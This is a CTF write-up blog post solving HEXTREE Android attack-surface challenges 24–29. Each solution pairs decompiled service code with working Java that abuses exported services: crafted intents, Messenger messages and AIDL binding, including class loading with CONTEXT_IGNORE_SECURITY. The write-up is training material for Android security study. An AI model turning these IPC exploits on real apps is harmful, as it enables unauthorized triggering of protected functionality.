+++
date = '2025-07-30T00:55:36+03:00'
draft = false
title = 'HEX Tree Services Challenges'
tags = ['ctf', 'Andorid', 'services', 'hextree']

+++

### Flag 24
#### Code analysis

```xml
<activity
            android:name="io.hextree.attacksurface.activities.Flag24Activity"
            android:exported="false"/>
```

```java
public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.f = new LogHelper(this);
        Intent intent = getIntent();
        String stringExtra = intent.getStringExtra("secret");
        this.f.addTag(intent.getAction());
        if (Flag24Service.secret.equals(stringExtra)) {
            success(this);
        }
    }
```

The activity waits for an intent that has `secret` extra string and if it's equal to the same value in `Flag24Service` we get our flag. But since we cant get in need another way

```xml
<service
    android:name="io.hextree.attacksurface.services.Flag24Service"
	android:enabled="true"
    android:exported="true">
    <intent-filter>
	    <action android:name="io.hextree.services.START_FLAG24_SERVICE"/>
    </intent-filter>
</service>
```

this an exposed service that listens to action named `io.hextree.services.START_FLAG24_SERVICE`

```java
 @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        if (intent.getAction().equals("io.hextree.services.START_FLAG24_SERVICE")) {
            success();
        }
        return super.onStartCommand(intent, i, i2);
    }

    private void success() {
        Intent intent = new Intent(this, (Class<?>) Flag24Activity.class);
        intent.setAction("io.hextree.services.START_FLAG24_SERVICE");
        intent.putExtra("secret", secret);
        intent.addFlags(268468224);
        intent.putExtra("hideIntent", true);
        startActivity(intent);
    }

```

In the service when it's started it checks for the action of intent and when it's true a method that will create an intent with extra string `secret` and will start `flag24activity` 

#### Solution

Sending an intent with action `"io.hextree.services.START_FLAG24_SERVICE"` to the service will do the trick

```java
Intent send = new Intent();  
send.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag24Service");  
send.setAction("io.hextree.services.START_FLAG24_SERVICE");  
startService(send);
```

### Flag 25
#### Code analysis
```java
    boolean lock1 = false;
    boolean lock2 = false;
    boolean lock3 = false;
    
    public int onStartCommand(Intent intent, int i, int i2) {
        if (intent != null) {
            if (intent.getAction().equals("io.hextree.services.UNLOCK1")) {
                this.lock1 = true;
            }
            if (intent.getAction().equals("io.hextree.services.UNLOCK2")) {
                if (this.lock1) {
                    this.lock2 = true;
                } else {
                    resetLocks();
                }
            }
            if (intent.getAction().equals("io.hextree.services.UNLOCK3")) {
                if (this.lock2) {
                    this.lock3 = true;
                } else {
                    resetLocks();
                }
            }
            if (this.lock1 && this.lock2 && this.lock3) {
                success();
                resetLocks();
            }
        }
    }
    private void success() {
        Intent intent = new Intent(this, (Class<?>) Flag25Activity.class);
        intent.putExtra("secret", secret);
        intent.putExtra("lock", "lock1");
        intent.putExtra("lock2", "lock3");
        startActivity(intent);
    }
```

This service has 3 variables for 3 locks and with each lock is opened "_set to true_"  with each intent sent with valid action for example : `lock1 = true` when action is `io.hextree.services.UNLOCK1` and when all 3 locks are open a method  is called that will create an intent with some extra strings then activity25 needs so that we get our flag

#### Solution
since services keep the state of variables as long as service is running so we will send 3 intents to the service with that 3 locks actions 

```java
Intent send = new Intent();  
send.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service");  
send.setAction("io.hextree.services.UNLOCK1");  
startService(send);  
  
send.setAction("io.hextree.services.UNLOCK2");  
startService(send);  
  
send.setAction("io.hextree.services.UNLOCK3");  
startService(send);
```

### Flag 26
#### Code analysis
```java
public static final int MSG_SUCCESS = 42;
class IncomingHandler extends Handler {
        String echo;
        IncomingHandler(Looper looper) {
            super(looper);
            this.echo = "";
        }
        @Override // android.os.Handler
        public void handleMessage(Message message) {
            Log.i("Flag26Service", "handleMessage(" + message.what + ")");
            if (message.what == 42) {
                Flag26Service.this.success(this.echo);
            } else {
                super.handleMessage(message);
            }
        }
    }
```

The service is listening for incoming messages using `IncomingHandler` and If the message type (`message.what`) is `42` it will call `success` method

#### Solution

So binds to `Flag26Service` and sends a message with `what = 42` to trigger the success condition.
First we establish a server connection that will have our message and send it then we bind to it with `bindservice`  

```java
private ServiceConnection serviceConnection1 = new ServiceConnection() {  
    @Override  
    public void onServiceConnected(ComponentName name, IBinder service) {  
        serviceMessenger = new Messenger(service);  
        Message msg = Message.obtain(null, 42);  
        try{  
            serviceMessenger.send(msg);  
        }  
        catch (RemoteException e){  
            throw new RuntimeException(e);  
        }  
    }  
    @Override  
    public void onServiceDisconnected(ComponentName name) {  
    }  
};
```

```java
Intent send = new Intent();  
send.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag26Service");  
bindService(send,serviceConnection1, Context.BIND_AUTO_CREATE);
```

### Flag 27
#### Code analysis
```java
public void handleMessage(Message message) {
            int i = message.what;
            if (i == 1) {
                this.echo = message.getData().getString("echo");
                Toast.makeText(Flag27Service.this.getApplicationContext(), this.echo, 0).show();
                return;
            }
            if (i != 2) {
                if (i == 3) {
                    String string = message.getData().getString("password");
                    if (!this.echo.equals("give flag") || !this.password.equals(string)) {
                        Flag27Service.this.sendReply(message, "no flag");
                        return;
                    } else {
                        Flag27Service.this.sendReply(message, "success! Launching flag activity");
                        Flag27Service.this.success(this.echo);
                        return;
                    }
                }
                super.handleMessage(message);
                return;
            }
```

The service processes messages based on `message.what` (an integer representing the message type):
- case  = 1: an echo message is extracted and displayed via a toast
- case  = 3: string `password` & `echo` are extracted and compared to some values and if true we get our flag

```java
            if (message.obj == null) {
                Flag27Service.this.sendReply(message, "Error");
                return;
            }
            Message obtain = Message.obtain((Handler) null, message.what);
            Bundle bundle = new Bundle();
            String uuid = UUID.randomUUID().toString();
            this.password = uuid;
            bundle.putString("password", uuid);
            obtain.setData(bundle);
            try {
                message.replyTo.send(obtain);
                Flag27Service.this.sendReply(message, "Password");
            } catch (RemoteException e) {
                throw new RuntimeException(e);
            }
        }
    }
```

- case = 2 : if message object is not null it will generates a random UUID as a password then Sends the password back to the us via `message.replyTo`.

```java
    public void sendReply(Message message, String str) {
        try {
            Message obtain = Message.obtain((Handler) null, message.what);
            obtain.getData().putString("reply", str);
            message.replyTo.send(obtain);
        } catch (RemoteException e) {
            e.printStackTrace();
        }
    }

```

- Sends a reply back to the client using `message.replyTo`.
- The reply contains:
    - The same `what` value as the original message.
    - A `reply` string in the `Bundle`.


#### Solution

we need to create a connection to service and obtain the result with value `2` to get `password` then we will use it and send it along with `echo` and we will use `IncomingMessageHandle()` to send message content 

```java
private static Messenger serviceMessenger = null;  
private static String obtainedPassword;  
private static final Messenger clientMessegener = new Messenger(new services.IncomingMessageHandle());

private ServiceConnection serviceConnection2 = new ServiceConnection() {  
    @Override  
    public void onServiceConnected(ComponentName name, IBinder binder) {  
        serviceMessenger = new Messenger(binder);  
  
        Message msg = Message.obtain(null, 2);  
        msg.obj = new Bundle();  
        msg.replyTo = new Messenger(new IncomingMessageHandle());  
        try{  
            serviceMessenger.send(msg);  
        }  
        catch (RemoteException e){  
            throw new RuntimeException(e);  
        }  
    }  
    @Override  
    public void onServiceDisconnected(ComponentName name) {  
    }  
};
```

```java
static class IncomingMessageHandle extends Handler {  
    IncomingMessageHandle() {super(Looper.getMainLooper());}  
    @Override  
    public void handleMessage(Message msg) { 
     
        Bundle reply =  msg.getData();  
        obtainedPassword = reply.getString("password");  
        if(reply != null && obtainedPassword != null) {  
            Log.i("msg", reply.toString());  
            Log.d("password", "Obtained password: " + obtainedPassword);  
  
            msg = Message.obtain(null, 1);  
            Bundle bundle = new Bundle();  
            bundle.putString("echo", "give flag");  
            msg.setData(bundle);  
            msg.replyTo = clientMessegener;  
            try {  
                serviceMessenger.send(msg);  
            } catch (RemoteException e) {  
                e.printStackTrace();  
            }  


            msg = Message.obtain(null, 3);  
            bundle = new Bundle();  
            bundle.putString("password", obtainedPassword);  
            msg.setData(bundle);  
            msg.replyTo = clientMessegener;  
            try {  
                serviceMessenger.send(msg);  
            } catch (RemoteException e) {  
                e.printStackTrace();  
            }  
        }  
        else{  
            Log.i("X", "NO Reply");  
        }  
    }  
}
```

```java
Intent send = new Intent();  
send.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag27Service");  
bindService(send,serviceConnection2, Context.BIND_AUTO_CREATE);
```

### Flag 28
#### Code analysis
```java
package io.hextree.attacksurface.services;
private final IFlag28Interface.Stub binder = new IFlag28Interface.Stub() {
        @Override // io.hextree.attacksurface.services.IFlag28Interface
        public boolean openFlag() throws RemoteException {
            return success();
        }

        public boolean success() {
            Intent intent = new Intent();
            intent.setClass(Flag28Service.this, Flag28Activity.class);
            intent.putExtra("secret", Flag28Service.secret);
            intent.addFlags(268468224);
            intent.putExtra("hideIntent", true);
            Flag28Service.this.startActivity(intent);
            return true;
        }
    };
```

by looking at the `onBind()` method that returns some kind of `.Stub` binder Which means we are dealing with AIDL file, Looking more we can see that it only implements  a single method of type Boolean  that just by calling The method we get `success` called 

#### Solution

In order for our app to call this method it needs to know it in the first place right? so reversing the aidl we get

##### Defining the file

```java
// IFlag28Interface.aidl  
package io.hextree.attacksurface.services;  
  
interface IFlag28Interface {     
	boolean openFlag();  
}
```

now creating  a connection to service and using `IFlag28Interface` to get access to methods in it we call `openFlag`
```java
Intent send = new Intent();  
send.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag28Service");  
ServiceConnection serviceConnection3 = new ServiceConnection() {  
    @Override  
    public void onServiceConnected(ComponentName name, IBinder service) {  
        IFlag28Interface remoteService = IFlag28Interface.Stub.asInterface(service);  
        try {  
            remoteService.openFlag();  
        } catch (RemoteException e) {  
            throw new RuntimeException(e);  
        }  
    }  
    @Override  
    public void onServiceDisconnected(ComponentName name) {  
    }  
};  
  
bindService(send,serviceConnection3, Context.BIND_AUTO_CREATE);
```

##### Class loading 

```java
Intent send = new Intent();  
send.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag28Service");  
ServiceConnection serviceConnection4 = new ServiceConnection() {  
    @Override  
    public void onServiceConnected(ComponentName name, IBinder service) {  
        // Load the class dynamically  
        ClassLoader classLoader = null;  
        try {  
            classLoader = services.this.createPackageContext("io.hextree.attacksurface",  
                    Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY).getClassLoader();  
            Class<?> iRemoteServiceClass;  
            // Load the AIDL interface class  
            iRemoteServiceClass = classLoader.loadClass("io.hextree.attacksurface.services.IFlag28Interface");  
            Class<?> stubClass = null;  
            for (Class<?> innerClass : iRemoteServiceClass.getDeclaredClasses()) {  
                if (innerClass.getSimpleName().equals("Stub")) {  
                    stubClass = innerClass;  
                    break;  
                }  
            }  
            // Get the asInterface method  
            Method asInterfaceMethod = stubClass.getDeclaredMethod("asInterface", IBinder.class);  
  
 // Invoke the asInterface method to get the instance of IRemoteService
        Object iRemoteService = asInterfaceMethod.invoke(null, service);

        // Call the init method and get the returned string
        Method openFlagMethod = iRemoteServiceClass.getDeclaredMethod("openFlag");
        boolean initResult = (boolean) openFlagMethod.invoke(iRemoteService);
  
  
        } catch (Exception e) {  
            Log.e("Flag29Service", "Error creating package context", e);  
        }  
    }  
  
    @Override  
    public void onServiceDisconnected(ComponentName name) {  
    }  
};  
  
bindService(send,serviceConnection4, Context.BIND_AUTO_CREATE);
```

### Flag 29
#### Code analysis
```java
package io.hextree.attacksurface.services;

    private final IFlag29Interface.Stub binder = new IFlag29Interface.Stub() { 
        
        Intent intent = new Intent();

        @Override // io.hextree.attacksurface.services.IFlag29Interface
        public String init() throws RemoteException {
            Log.i("Flag29", "service.init()");
            return this.pw;
        }

        @Override // io.hextree.attacksurface.services.IFlag29Interface
        public void authenticate(String str) throws RemoteException {
            Log.i("Flag29", "service.authenticate(" + str + ")");
            if (str.equals(this.pw)) {
                this.intent.putExtra("authenticated", true);
            } else {
                this.intent.removeExtra("authenticated");
            }
        }

        @Override // io.hextree.attacksurface.services.IFlag29Interface
        public void success() throws RemoteException {
            Log.i("Flag29", "service.success()");
            this.intent.setClass(Flag29Service.this, Flag29Activity.class);
            if (this.intent.getBooleanExtra("authenticated", false)) {
                this.intent.putExtra("secret", Flag29Service.secret);
                this.intent.addFlags(268435456);
                this.intent.putExtra("hideIntent", true);
                Flag29Service.this.startActivity(this.intent);
            }
        }
    };
```

The service uses `init()` to initiate flag29 and return a string  then `authenticate` takes a string and if that string is the same an  `authenticated` string is added to intent along with `true` value

```java
public interface IFlag29Interface extends IInterface {
    public static final String DESCRIPTOR = "io.hextree.attacksurface.services.IFlag29Interface";

    public static class Default implements IFlag29Interface {
        @Override // android.os.IInterface
        public IBinder asBinder() {
            return null;
        }
//our 3 methods 
        @Override // io.hextree.attacksurface.services.IFlag29Interface
        public void authenticate(String str) throws RemoteException {
        }

        @Override // io.hextree.attacksurface.services.IFlag29Interface
        public String init() throws RemoteException {
            return null;
        }

        @Override // io.hextree.attacksurface.services.IFlag29Interface
        public void success() throws RemoteException {
        }
    }

    public static abstract class Stub extends Binder implements IFlag29Interface {
        static final int TRANSACTION_authenticate = 2;
        static final int TRANSACTION_init = 1;
        static final int TRANSACTION_success = 3;

```

okay now from here we have the `DESCRIPTOR` and the order of methods should be 
1. init()
2. authenticate()
3. success()
#### Solution

##### Defining the file
Now creating the aidl file with the order in mind we get

```java
// IFlag29Interface.aidl  
package io.hextree.attacksurface.services;  

interface IFlag29Interface {  
	String init();  
	void authenticate(String str);  
    void success();  
}
```

then in our app we create a service connection using `IFlag29Interface` and calling  `init()` while saving the string returned in `pass` then passing it to `authenticate()` and finally calling `success()`

```java
Intent send = new Intent();  
send.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag29Service");  
ServiceConnection serviceConnection4 = new ServiceConnection() {  
    @Override  
    public void onServiceConnected(ComponentName name, IBinder service) {  
        IFlag29Interface remoteService = IFlag29Interface.Stub.asInterface(service);  
        try {  
            String pass = remoteService.init();  
            remoteService.authenticate(pass);  
            remoteService.success();  
        } catch (RemoteException e) {  
            throw new RuntimeException(e);  
        }  
    }  
  
    @Override  
    public void onServiceDisconnected(ComponentName name) {  
    }  
};  
  
bindService(send,serviceConnection4, Context.BIND_AUTO_CREATE);
```

##### Class loading 

```java
Intent send = new Intent();  
send.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag29Service");  
ServiceConnection serviceConnection4 = new ServiceConnection() {  
    @Override  
    public void onServiceConnected(ComponentName name, IBinder service) {  
        // Load the class dynamically  
        ClassLoader classLoader = null;  
        try {  
            classLoader = services.this.createPackageContext("io.hextree.attacksurface",  
                    Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY).getClassLoader();  
            Class<?> iRemoteServiceClass;  
            // Load the AIDL interface class  
            iRemoteServiceClass = classLoader.loadClass("io.hextree.attacksurface.services.IFlag29Interface");  
            Class<?> stubClass = null;  
            for (Class<?> innerClass : iRemoteServiceClass.getDeclaredClasses()) {  
                if (innerClass.getSimpleName().equals("Stub")) {  
                    stubClass = innerClass;  
                    break;  
                }  
            }  
            // Get the asInterface method  
            Method asInterfaceMethod = stubClass.getDeclaredMethod("asInterface", IBinder.class);  
  
            // Invoke the asInterface method to get the instance of IRemoteService  
            Object iRemoteService = asInterfaceMethod.invoke(null, service);  
  
            // Call the init method and get the returned string  
            Method initMethod = iRemoteServiceClass.getDeclaredMethod("init");  
            String password = (String) initMethod.invoke(iRemoteService);  
            Log.d("Flag29Service", "Password: " + password);  
  
            // Call the authenticate method with the password  
            Method authenticateMethod = iRemoteServiceClass.getDeclaredMethod("authenticate", String.class);  
            authenticateMethod.invoke(iRemoteService, password);  
  
            // Call the success method  
            Method successMethod = iRemoteServiceClass.getDeclaredMethod("success");  
            successMethod.invoke(iRemoteService);  
  
  
        } catch (Exception e) {  
            Log.e("Flag29Service", "Error creating package context", e);  
        }  
    }  
  
    @Override  
    public void onServiceDisconnected(ComponentName name) {  
    }  
};  
  
bindService(send,serviceConnection4, Context.BIND_AUTO_CREATE);
```